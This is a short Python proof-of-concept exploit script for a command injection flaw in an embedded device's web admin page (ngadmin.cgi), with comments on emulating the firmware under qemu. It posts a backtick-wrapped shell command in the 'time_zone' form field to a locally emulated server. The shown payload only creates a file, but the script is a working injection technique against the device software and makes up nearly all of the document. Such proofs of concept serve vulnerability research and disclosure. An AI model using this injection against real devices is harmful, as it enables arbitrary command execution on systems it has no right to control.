"""
exp.py
author: eut0pl4
An script for cmdi vulnerability
"""
# emulation method
# sudo chroot . ./qemu-armeb-static /bin/sh
# cd /home/httpd
# /usr/bin/mini_httpd-ssl -u root -c "./*.cgi|cgi-bin/*" -l test.log

import requests

url = "http://127.0.0.1/ngadmin.cgi?action=lan"

data = {
    "time_zone": "`touch eut0pl4.txt`",
    "useCustomNtpServer": "on",
}

headers = {"Content-Type": "application/x-www-form-urlencoded"}

resp = requests.post(url, data=data)

print(resp.status_code)
print(resp.text)
